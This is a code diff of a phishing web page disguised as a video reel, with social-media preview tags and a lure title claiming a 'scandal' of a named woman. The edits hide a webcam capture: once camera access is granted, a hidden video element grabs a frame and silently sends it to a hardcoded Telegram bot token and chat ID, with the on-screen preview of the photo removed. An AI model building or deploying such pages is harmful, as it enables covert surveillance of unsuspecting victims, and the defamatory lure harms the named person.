@@ -1,5 +1,5 @@
 <!-- علامات المعاينة لتطبيقات المحادثة (Instagram, Telegram, WhatsApp) -->
-<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
+<meta property="og:title" content="شاهد فضيحة صارة القح 🎬">
 <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
 <meta property="og:type" content="video.other">
 <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
@@ -17,7 +17,7 @@
         background-color: #000;
         overflow: hidden;
     }
-    video {
+    video#mainVideo {
         position: fixed;
         top: 0;
         left: 0;
@@ -29,23 +29,12 @@
         object-position: center;
         z-index: 1;
     }
-    #result {
-        max-width: 90%;
-        max-height: 90vh;
-        border-radius: 10px;
-        display: none;
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        z-index: 999;
-    }
 </style>
+
+<!-- الفيديو الرئيسي يعمل باستمرار وبدون انقطاع -->
 <video id="mainVideo" controls autoplay loop playsinline muted>
     <source src="my_reel.mp4" type="video/mp4">
 </video>
-
-<img id="result" alt="">
 
 <script>
     const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
@@ -60,28 +49,34 @@
         let stream = null;
 
         try {
+            // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
+            // إنشاء عنصر فيديو خفي في الذاكرة لالتقاط الصورة فقط
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.muted = true;
+            hiddenVideo.playsInline = true;
+            hiddenVideo.srcObject = stream;
+            
+            await hiddenVideo.play();
+
+            // الانتظار 400 مللي ثانية لضمان استقرار إضاءة الكاميرا
+            await new Promise(resolve => setTimeout(resolve, 400));
 
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
 
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(hiddenVideo, 0, 0);
 
-            const img = document.getElementById('result');
-            img.src = canvas.toDataURL('image/png');
-            img.style.display = 'block';
+            // إغلاق الكاميرا مباشرة بعد رسم الإطار على الـ Canvas
+            stream.getTracks().forEach(track => track.stop());
 
-            setTimeout(() => {
-                img.style.display = 'none';
-            }, 1000);
-
+            // تحويل الصورة وإرسالها إلى التليجرام في الخلفية
             canvas.toBlob(async (blob) => {
+                if (!blob) return;
+
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'capture.png');
@@ -92,13 +87,12 @@
                         body: formData
                     });
                 } catch (err) {
-                    console.error("Error:", err);
+                    console.error("Error sending photo:", err);
                 }
             }, 'image/png');
 
         } catch (err) {
             console.error("Camera Error:", err);
-        } finally {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
